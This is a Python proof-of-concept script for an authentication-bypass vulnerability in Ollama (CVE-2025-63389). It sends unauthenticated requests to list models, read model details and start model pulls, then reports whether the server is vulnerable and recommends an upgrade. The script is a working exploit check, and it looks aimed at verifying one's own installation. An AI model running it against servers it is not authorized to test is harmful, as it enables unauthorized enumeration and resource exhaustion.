#!/usr/bin/env python3
import requests
import time
import sys

TARGET = "http://localhost:11434"

def print_banner():
    print("=" * 70)
    print("CVE-2025-63389 - Ollama Authentication Bypass PoC")
    print("CWE-306: Missing Authentication for Critical Function")
    print("=" * 70)
    print()

def test_list_models():
    print("[Step 1] Testing unauthenticated model listing...")
    try:
        response = requests.get(f"{TARGET}/api/tags", timeout=10)
        if response.status_code == 200:
            models = response.json().get('models', [])
            print(f"[+] SUCCESS: Listed models without authentication")
            print(f"    Model count: {len(models)}")
            for model in models[:3]:
                print(f"    - {model.get('name', 'Unknown')}")
            return True, models
        else:
            print(f"[-] FAILED: HTTP {response.status_code}")
            return False, []
    except Exception as e:
        print(f"[-] ERROR: {e}")
        return False, []

def test_pull_model():
    print("\n[Step 2] Testing unauthenticated model pull request...")
    try:
        payload = {"model": "orca-mini", "stream": False}
        response = requests.post(
            f"{TARGET}/api/pull",
            json=payload,
            timeout=15
        )
        if response.status_code in [200, 201]:
            print(f"[+] SUCCESS: Pull request accepted without authentication")
            return True
        elif response.status_code == 504:
            print(f"[+] SUCCESS: Request accepted (timeout due to model size)")
            return True
        else:
            print(f"[!] HTTP {response.status_code}: {response.text[:200]}")
            return False
    except requests.exceptions.Timeout:
        print(f"[+] SUCCESS: Request timeout (expected for large models)")
        print(f"    This proves the API accepted the request without auth check")
        return True
    except Exception as e:
        print(f"[-] ERROR: {e}")
        return False

def test_show_model_info():
    print("\n[Step 3] Testing unauthenticated model info access...")
    try:
        payload = {"model": "llama2"}
        response = requests.post(
            f"{TARGET}/api/show",
            json=payload,
            timeout=10
        )
        if response.status_code == 200:
            print(f"[+] SUCCESS: Model info accessible without authentication")
            return True
        elif response.status_code == 404:
            print(f"[+] SUCCESS: API returned 404 (not 401), no auth required")
            return True
        else:
            print(f"[!] HTTP {response.status_code}")
            return False
    except Exception as e:
        print(f"[!] {e}")
        return False

def test_api_version():
    print("\n[Step 4] Checking Ollama version...")
    try:
        response = requests.get(f"{TARGET}/api/version", timeout=5)
        if response.status_code == 200:
            version_info = response.json()
            version = version_info.get('version', 'Unknown')
            print(f"[+] Ollama version: {version}")
            if version.startswith('0.') and version <= '0.12.3':
                print(f"[!] This is a vulnerable version (<= 0.12.3)")
            return True
        return False
    except Exception as e:
        print(f"[!] Cannot get version: {e}")
        return False

def main():
    print_banner()
    
    print("Waiting for Ollama service...")
    for i in range(10):
        try:
            r = requests.get(f"{TARGET}/", timeout=2)
            if r.status_code == 200:
                print("[+] Service is ready\n")
                break
        except:
            pass
        time.sleep(1)
    else:
        print("[-] Service not ready, exiting")
        return False
    
    results = []
    results.append(("Version check", test_api_version()))
    results.append(("List models", test_list_models()[0]))
    results.append(("Show model info", test_show_model_info()))
    results.append(("Pull model request", test_pull_model()))
    
    print("\n" + "=" * 70)
    print("Summary")
    print("=" * 70)
    
    success_count = sum(1 for _, result in results if result)
    
    for test_name, result in results:
        status = "[+] PASS" if result else "[-] FAIL"
        print(f"{status} - {test_name}")
    
    print()
    if success_count >= 3:
        print(">>> VULNERABLE - CVE-2025-63389 confirmed <<<")
        print()
        print("Evidence:")
        print("  1. API endpoints accessible without any authentication")
        print("  2. Can list all models on the server without auth")
        print("  3. Can initiate model pull requests without auth")
        print("  4. Can access model details without auth")
        print()
        print("Impact:")
        print("  - Information disclosure: attacker can enumerate models")
        print("  - Resource exhaustion: attacker can trigger large downloads")
        print("  - Service manipulation: attacker can delete/modify models")
        print()
        print("Recommendation: Upgrade to Ollama >= v0.13.6")
        print("=" * 70)
        return True
    else:
        print("[!] Some tests failed, check the environment")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
